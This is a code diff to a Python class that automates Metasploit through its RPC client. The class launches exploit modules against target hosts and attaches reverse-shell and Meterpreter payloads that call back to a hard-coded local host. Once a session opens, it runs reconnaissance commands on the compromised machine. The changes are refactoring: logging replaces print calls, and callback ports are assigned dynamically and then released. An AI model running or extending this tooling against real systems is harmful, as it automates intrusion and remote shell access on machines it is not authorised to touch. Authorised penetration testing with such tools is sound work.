@@ -24,7 +24,8 @@ LHOSTIP = '192.168.1.50'
 class MetasploitInterface:
     portBindings = [55553]
 
-    def __init__(self, metasploit_ip, metasploit_port, metasploit_pass): # Just for metasploit connection
+    def __init__(self, metasploit_ip, metasploit_port, metasploit_pass, logLevel): # Just for metasploit connection
+        self.logLevel = logging.basicConfig(level=logLevel)
         self.metasploit_ip = metasploit_ip
         self.metasploit_port = metasploit_port
         self.metasploit_pass = metasploit_pass
@@ -104,10 +105,10 @@ class MetasploitInterface:
      
         """ SETS PAYLOAD FOR EXPLOIT & LOCAL HOST ADDRESS???"""
         payload = self.client.modules.use('payload', 'cmd/unix/reverse')
-        
+        localPort = self.generateLPORT()
         payload['LHOST'] = LHOSTIP
-        payload['LPORT'] = self.generateLPORT()
-        print(payload.runoptions)
+        payload['LPORT'] = localPort
+        # print(payload.runoptions)
         
         """ CREATES CONSOLE ID FOR EXECUTION OF EXPLOIT & PRINTS EXPLOIT results"""
         cid = self.client.consoles.console().cid
@@ -182,7 +183,7 @@ class MetasploitInterface:
         
             
         self.client.consoles.console(cid).destroy
-        # self.portBindings.remove()
+        self.portBindings.remove(localPort)
         
         ##print(exploit.targetpayloads())
         return success, user_level, results
@@ -238,9 +239,12 @@ class MetasploitInterface:
         exploit = self.client.modules.use(module, specific_module)
         exploit["RHOSTS"] = target
         exploit["RPORT"] = port
+
+        localPort = self.generateLPORT()
+
         payload = self.client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
         payload['LHOST'] = LHOSTIP
-        payload['LPORT'] = 5557
+        payload['LPORT'] = localPort
         
         """ Creates and Executes Exploit & Prints out shell results from target"""
         cid = self.client.consoles.console().cid
@@ -295,6 +299,7 @@ class MetasploitInterface:
         
         self.client.consoles.console(cid).destroy
 
+        self.portBindings.remove(localPort)
         return success, user_level, results
 
     def rdpScanner(self, target, exploit, port):
@@ -423,8 +428,6 @@ class MetasploitInterface:
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
         logging.info(results)
 
-        success = False
-        user_level = ""
 
         if "Successful FTP Login" in results:
             success = True
@@ -456,9 +459,6 @@ class MetasploitInterface:
         cid = self.client.consoles.console().cid
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
         logging.info(results)
-
-        success = False
-        user_level = ""
        
         if "target is vulnerable" in results:
             success = True
@@ -490,8 +490,6 @@ class MetasploitInterface:
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
         logging.info(results)
 
-        success = False
-        user_level = ""
        
         if "VULNERABLE" in results:
             success = True
@@ -523,9 +521,6 @@ class MetasploitInterface:
         results = self.client.consoles.console(cid).run_module_with_output(exploit)
         logging.info(results)
 
-        success = False
-        user_level = ""
-       
         if "VULNERABLE" in results:
             success = True
             user_level = ""
@@ -676,7 +671,7 @@ class MetasploitInterface:
         """ SETS UP EXPLOIT and TARGET"""
         exploit = self.client.modules.use(module, specific_module)
         
-        print(exploit.missing_required)
+        # print(exploit.missing_required)
         exploit["RHOSTS"] = target
         exploit["RPORT"] = port
         # exploit["fDisableCam"] = 0
@@ -687,49 +682,53 @@ class MetasploitInterface:
         try:
             sid_before = list(self.client.sessions.list.keys())[-1]
             results = self.client.consoles.console(cid).run_module_with_output(exploit)
-            if (self.verbosity == "INFO" or self.verbosity == "ALL"):
-                print(results)
+            logging.info(results)
+            # if (self.verbosity == "INFO" or self.verbosity == "ALL"):
+            #     print(results)
             sid_after = list(self.client.sessions.list.keys())[-1]
 
         except IndexError as e:
             sid_before = 0
             results = self.client.consoles.console(cid).run_module_with_output(exploit)
-            if (self.verbosity == "DEBUG" or self.verbosity == "ALL"):
-                print(results)
-                print(e)
+            logging.info(results)
+            # if (self.verbosity == "DEBUG" or self.verbosity == "ALL"):
+            #     print(results)
+            #     print(e)
             try:
                 sid_after = list(self.client.sessions.list.keys())[-1]
             except IndexError as e:
-                if (self.verbosity == "DEBUG" or self.verbosity == "ALL"):
-                    print(e)
-                    print("No sessions on start and host not vulnerable")
+                logging.debug(e)
                 sid_after = 0
         
         if(sid_before == sid_after):
-            if (self.verbosity == "DEBUG" or self.verbosity == "ALL"):
-                print("SIDs DO MATCH - Did not work")
-                print("There was an issue creating a session or the host is not vulnerable (see below): ")
+            logging.debug("There was an issue creating a session or the host is not vulnerable" )
+            # print("SIDs DO MATCH - Did not work")
+            # print("There was an issue creating a session or the host is not vulnerable (see below): ")
             user_level = "No access"
             success = False
            
         else:
             try:
                 shell = self.client.sessions.session(sid_after)
-                print(sid_after)
-                shell.write('echo %USERDOMAIN%\%USERNAME%')
-                time.sleep(3)
-                user_level = shell.read()
-                print("User Level: " + user_level)
-                shell.write('pwd')
-                time.sleep(3)
-                print(f"Directory Location: {shell.read()}")
-                shell.write('ipconfig')
-                time.sleep(3)
-                print(f"Address Properties:\n {shell.read()}")
+                # print(sid_after)
+                user_level = shell.run_with_output('echo %USERDOMAIN%\%USERNAME%')
+                
+                # user_level = shell.read()
+                # print("User Level: " + user_level)
+                directory = shell.run_with_output('pwd')
+               
+                # print(f"Directory Location: {shell.read()}")
+                properties = shell.run_with_output('ipconfig')
+                
+                # print(f"Address Properties:\n {shell.read()}")
                 success = True
+
+                logging.info(f'User Level: {user_level}')
+                logging.info(f'Directory Location: {directory}')
+                logging.info(f'Address Properties:\n {properties}')
             
             except Exception as e:
-                print(e)
+                logging.debug(e)
                 user_level = "No access"
                 success = False
         
